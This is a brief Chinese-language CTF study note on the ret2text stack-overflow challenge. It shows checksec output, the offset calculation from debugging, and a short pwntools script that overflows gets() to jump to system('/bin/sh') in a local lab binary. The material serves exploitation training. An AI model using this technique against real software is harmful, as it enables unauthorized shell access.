[栈溢出基础](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/stackoverflow_basic/)

样例情况

[基本ROP](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/basic_rop/)

ROP概念

ret2text

简介：

控制程序执行程序本身已有的代码。

核心

确定我们能够控制的内存的起始地址距离 main 函数的返回地址的字节数。

样例

分析 ret2text：

checksec

```
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

打开IDA分析

发现gets函数存在栈溢出的可能，在`secure()`函数中发现了`system("/bin/sh");`这一指令。

查看汇编指令及相应的内存地址，我们我们需要将返回值返回到这里就可以了。

将断点下在 `0x080486AE` 并进行调试。

此时 `$esp` 的值为 `0xffffcde0` ，`$ebp` 的值为 `0xffffce68 ` 。由IDA的反汇编知字符串 `s` 相对于 `$esp` 的偏移为 `0x1c` ，所以 `s` 的地址为 `0xffffcdfc` 。所以 `s` 相对 `$ebp` 的偏移为 `0x6c` ，相对于返回地址的偏移为`0x6c+4=0x70` 。则可以构造出 payload:

```python
import pwn
p = pwn.process('./ret2text')
sh_addr = 0x0804863A
p.sendline('a'*(0x6c+4)+pwn.p32(sh_addr))
p.interactive()
```

这样就可以拿到shell了。